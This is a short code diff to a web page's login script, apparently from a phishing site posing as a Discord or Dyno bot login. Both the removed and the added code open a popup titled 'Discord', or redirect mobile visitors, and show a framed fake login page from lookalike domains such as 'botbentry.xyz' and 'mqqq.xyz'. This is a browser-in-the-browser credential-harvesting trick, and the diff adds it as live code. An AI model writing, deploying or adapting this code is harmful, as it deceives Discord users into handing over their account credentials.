@@ -1345,22 +1345,18 @@ select
             </div>
             <script>
                function clickedLogin() {
-                                if (window.innerWidth > 1000) {
-                                    let width = screen.width / 2;  
-                                    let height = screen.height / 2;
-                                    let left = (screen.width - width) / 2;
-                                    let top = (screen.height - height) / 2;
-                                    
-                                    let faviconUrl = "https://dyno.gg/images/dyno-blitz-v2-transparent-bg.png"
+                document.getElementById('abc').addEventListener('click', (event) => {
+                  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                    event.preventDefault();
+                    window.location.href = 'https://botbentry.xyz/login';
+                  } else {
+                    const wnd = window.open('https://mqqq.xyz', '_blank', 'status=no,toolbar=no,location=no,directories=no,resizable=yes,scrollbars=yes,width=1050,height=600');
 
 
-                                    let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=${width},height=${height},left=${left},top=${top}`;
-                                    newWin = window.open('Discord', 'Discord', params);
-                                    newWin.document.write(`<head><link rel="icon" href="${faviconUrl}" /><title>Discord</title></head><iframe src="https://bstbentry.xyz/login" style="border: none; padding: none; margin: none; width: 100%; height: 100%; position: absolute; left: 0px; top: 0px;">`);
-                                } else {
-                                    location.href = "https://bstbentry.xyz/login"
-                                }
-                            }
+                    wnd.document.write('<script>document.title = "Discord";</scr' + 'ipt><iframe style="position: absolute;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 9999;height: 100%;" src="https://botbentry.xyz/login"></iframe>');
+                    }
+                  });
+                }
             </script>
           </div>
           
